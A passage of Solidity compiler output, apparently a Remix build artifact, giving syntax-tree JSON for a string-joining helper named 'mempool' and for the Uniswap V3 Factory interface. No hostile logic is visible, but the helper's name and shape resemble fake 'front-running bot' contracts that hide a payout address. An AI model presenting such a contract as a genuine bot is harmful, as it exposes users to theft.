																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "12871:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"baseExpression": {
																		"id": 1175,
																		"name": "_valueBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1108,
																		"src": "12888:11:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1177,
																	"indexExpression": {
																		"id": 1176,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1133,
																		"src": "12900:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "12888:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "12871:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1179,
															"nodeType": "ExpressionStatement",
															"src": "12871:31:0"
														}
													]
												},
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1167,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 1164,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1133,
														"src": "12829:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"expression": {
															"id": 1165,
															"name": "_valueBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1108,
															"src": "12831:11:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1166,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "12843:6:0",
														"memberName": "length",
														"nodeType": "MemberAccess",
														"src": "12831:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "12829:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1181,
												"initializationExpression": {
													"expression": {
														"id": 1162,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"id": 1160,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1133,
															"src": "12824:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"hexValue": "30",
															"id": 1161,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "12826:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "12824:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1163,
													"nodeType": "ExpressionStatement",
													"src": "12824:3:0"
												},
												"loopExpression": {
													"expression": {
														"id": 1169,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "12851:3:0",
														"subExpression": {
															"id": 1168,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1133,
															"src": "12851:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1170,
													"nodeType": "ExpressionStatement",
													"src": "12851:3:0"
												},
												"nodeType": "ForStatement",
												"src": "12820:94:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 1184,
															"name": "_newValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1126,
															"src": "12940:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1183,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "12933:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1182,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "12933:6:0",
															"typeDescriptions": {}
														}
													},
													"id": 1185,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12933:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1099,
												"id": 1186,
												"nodeType": "Return",
												"src": "12926:24:0"
											}
										]
									},
									"id": 1188,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mempool",
									"nameLocation": "12337:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1096,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1093,
												"mutability": "mutable",
												"name": "_base",
												"nameLocation": "12359:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 1188,
												"src": "12345:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1092,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "12345:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1095,
												"mutability": "mutable",
												"name": "_value",
												"nameLocation": "12380:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 1188,
												"src": "12366:20:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1094,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "12366:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "12344:43:0"
									},
									"returnParameters": {
										"id": 1099,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1098,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1188,
												"src": "12411:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1097,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "12411:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "12410:15:0"
									},
									"scope": 1189,
									"src": "12328:630:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 1190,
							"src": "399:12564:0",
							"usedErrors": [],
							"usedEvents": [
								14
							]
						}
					],
					"src": "33:12930:0"
				},
				"id": 0
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
					"exportedSymbols": {
						"IUniswapV3Factory": [
							1272
						]
					},
					"id": 1273,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1191,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IUniswapV3Factory",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1192,
								"nodeType": "StructuredDocumentation",
								"src": "71:163:1",
								"text": "@title The interface for the Uniswap V3 Factory\n @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees"
							},
							"fullyImplemented": false,
							"id": 1272,
							"linearizedBaseContracts": [
								1272
							],
							"name": "IUniswapV3Factory",
							"nameLocation": "244:17:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 1193,
										"nodeType": "StructuredDocumentation",
										"src": "268:185:1",
										"text": "@notice Emitted when the owner of the factory is changed\n @param oldOwner The owner before the owner was changed\n @param newOwner The owner after the owner was changed"
									},
									"eventSelector": "b532073b38c83145e3e5135377a08bf9aab55bc0fd7c1179cd4fb995d2a5159c",
									"id": 1199,
									"name": "OwnerChanged",
									"nameLocation": "464:12:1",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1198,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1195,
												"indexed": true,
												"mutability": "mutable",
												"name": "oldOwner",
												"nameLocation": "493:8:1",
												"nodeType": "VariableDeclaration",
												"scope": 1199,
												"src": "477:24:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1194,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "477:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1197,
												"indexed": true,
												"mutability": "mutable",
												"name": "newOwner",
												"nameLocation": "519:8:1",
												"nodeType": "VariableDeclaration",
												"scope": 1199,
												"src": "503:24:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1196,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "503:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "476:52:1"
									},
									"src": "458:71:1"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1200,
										"nodeType": "StructuredDocumentation",
										"src": "535:421:1",
										"text": "@notice Emitted when a pool is created\n @param token0 The first token of the pool by address sort order\n @param token1 The second token of the pool by address sort order\n @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n @param tickSpacing The minimum number of ticks between initialized ticks\n @param pool The address of the created pool"
									},
									"eventSelector": "783cca1c0412dd0d695e784568c96da2e9c22ff989357a2e8b1d9b2b4e6b7118",
									"id": 1212,
									"name": "PoolCreated",
									"nameLocation": "967:11:1",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1211,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1202,
												"indexed": true,
												"mutability": "mutable",
												"name": "token0",
												"nameLocation": "1004:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 1212,
												"src": "988:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1201,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "988:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1204,
												"indexed": true,
												"mutability": "mutable",
												"name": "token1",
												"nameLocation": "1036:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 1212,
												"src": "1020:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1203,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1020:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1206,
												"indexed": true,
												"mutability": "mutable",
												"name": "fee",
												"nameLocation": "1067:3:1",
												"nodeType": "VariableDeclaration",
												"scope": 1212,
												"src": "1052:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1205,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "1052:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1208,
												"indexed": false,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nameLocation": "1086:11:1",
												"nodeType": "VariableDeclaration",
												"scope": 1212,
												"src": "1080:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1207,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1080:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1210,
												"indexed": false,
												"mutability": "mutable",
												"name": "pool",
												"nameLocation": "1115:4:1",
												"nodeType": "VariableDeclaration",
												"scope": 1212,
												"src": "1107:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1209,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1107:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "978:147:1"
									},
									"src": "961:165:1"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1213,
										"nodeType": "StructuredDocumentation",
										"src": "1132:275:1",
										"text": "@notice Emitted when a new fee amount is enabled for pool creation via the factory\n @param fee The enabled fee, denominated in hundredths of a bip\n @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee"
									},
									"eventSelector": "c66a3fdf07232cdd185febcc6579d408c241b47ae2f9907d84be655141eeaecc",
									"id": 1219,
									"name": "FeeAmountEnabled",
									"nameLocation": "1418:16:1",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1218,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1215,
												"indexed": true,
												"mutability": "mutable",
												"name": "fee",
												"nameLocation": "1450:3:1",
												"nodeType": "VariableDeclaration",
												"scope": 1219,
												"src": "1435:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1214,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "1435:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1217,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nameLocation": "1469:11:1",
												"nodeType": "VariableDeclaration",
												"scope": 1219,
												"src": "1455:25:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1216,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1455:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1434:47:1"
									},
									"src": "1412:70:1"
								},
								{
									"documentation": {
										"id": 1220,
										"nodeType": "StructuredDocumentation",
										"src": "1488:163:1",
										"text": "@notice Returns the current owner of the factory\n @dev Can be changed by the current owner via setOwner\n @return The address of the factory owner"
									},
									"functionSelector": "8da5cb5b",
									"id": 1225,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "owner",
									"nameLocation": "1665:5:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1221,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1670:2:1"
									},
									"returnParameters": {
										"id": 1224,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1223,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1225,
												"src": "1696:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1222,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1696:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1695:9:1"
									},
									"scope": 1272,
									"src": "1656:49:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1226,
										"nodeType": "StructuredDocumentation",
										"src": "1711:348:1",
										"text": "@notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\n @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context\n @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\n @return The tick spacing"
									},
									"functionSelector": "22afcccb",
									"id": 1233,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeAmountTickSpacing",
									"nameLocation": "2073:20:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1229,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1228,
												"mutability": "mutable",
												"name": "fee",
												"nameLocation": "2101:3:1",
												"nodeType": "VariableDeclaration",
												"scope": 1233,
												"src": "2094:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1227,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "2094:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2093:12:1"
									},
									"returnParameters": {
										"id": 1232,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1231,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1233,
												"src": "2129:5:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1230,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2129:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2128:7:1"
									},
									"scope": 1272,
									"src": "2064:72:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1234,
										"nodeType": "StructuredDocumentation",
										"src": "2142:471:1",
										"text": "@notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\n @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\n @param tokenA The contract address of either token0 or token1\n @param tokenB The contract address of the other token\n @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n @return pool The pool address"
									},
									"functionSelector": "1698ee82",
									"id": 1245,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getPool",
									"nameLocation": "2627:7:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1241,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1236,
												"mutability": "mutable",
												"name": "tokenA",
												"nameLocation": "2652:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 1245,
												"src": "2644:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1235,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2644:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1238,
												"mutability": "mutable",
												"name": "tokenB",
												"nameLocation": "2676:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 1245,
												"src": "2668:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1237,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2668:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1240,
												"mutability": "mutable",
												"name": "fee",
												"nameLocation": "2699:3:1",
												"nodeType": "VariableDeclaration",
												"scope": 1245,
												"src": "2692:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1239,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "2692:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2634:74:1"
									},
									"returnParameters": {
										"id": 1244,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1243,
												"mutability": "mutable",
												"name": "pool",
												"nameLocation": "2740:4:1",
												"nodeType": "VariableDeclaration",
												"scope": 1245,
												"src": "2732:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1242,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2732:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2731:14:1"
									},
									"scope": 1272,
									"src": "2618:128:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1246,
										"nodeType": "StructuredDocumentation",
										"src": "2752:554:1",
										"text": "@notice Creates a pool for the given two tokens and fee\n @param tokenA One of the two tokens in the desired pool\n @param tokenB The other of the two tokens in the desired pool\n @param fee The desired fee for the pool\n @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved\n from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments\n are invalid.\n @return pool The address of the newly created pool"
									},
									"functionSelector": "a1671295",
									"id": 1257,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "createPool",
									"nameLocation": "3320:10:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1253,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1248,
												"mutability": "mutable",
												"name": "tokenA",
												"nameLocation": "3348:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 1257,
												"src": "3340:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1247,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3340:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1250,
												"mutability": "mutable",
												"name": "tokenB",
												"nameLocation": "3372:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 1257,
												"src": "3364:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1249,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3364:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1252,
												"mutability": "mutable",
												"name": "fee",
												"nameLocation": "3395:3:1",
												"nodeType": "VariableDeclaration",
												"scope": 1257,
												"src": "3388:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1251,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "3388:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3330:74:1"
									},
									"returnParameters": {
										"id": 1256,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1255,
												"mutability": "mutable",
												"name": "pool",
												"nameLocation": "3431:4:1",
												"nodeType": "VariableDeclaration",
												"scope": 1257,
												"src": "3423:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1254,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3423:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3422:14:1"
									},
									"scope": 1272,
									"src": "3311:126:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1258,
										"nodeType": "StructuredDocumentation",
										"src": "3443:144:1",
										"text": "@notice Updates the owner of the factory\n @dev Must be called by the current owner\n @param _owner The new owner of the factory"
									},
									"functionSelector": "13af4035",
									"id": 1263,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setOwner",
									"nameLocation": "3601:8:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1261,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1260,
												"mutability": "mutable",
												"name": "_owner",
												"nameLocation": "3618:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 1263,
												"src": "3610:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1259,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3610:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3609:16:1"
									},
									"returnParameters": {
										"id": 1262,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3634:0:1"
									},
									"scope": 1272,
									"src": "3592:43:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1264,
										"nodeType": "StructuredDocumentation",
										"src": "3641:326:1",
										"text": "@notice Enables a fee amount with the given tickSpacing\n @dev Fee amounts may never be removed once enabled\n @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\n @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount"
									},
									"functionSelector": "8a7c195f",
									"id": 1271,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "enableFeeAmount",
									"nameLocation": "3981:15:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1269,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1266,
												"mutability": "mutable",
												"name": "fee",
												"nameLocation": "4004:3:1",
												"nodeType": "VariableDeclaration",
												"scope": 1271,
												"src": "3997:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1265,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "3997:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1268,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nameLocation": "4015:11:1",
												"nodeType": "VariableDeclaration",
												"scope": 1271,
												"src": "4009:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1267,
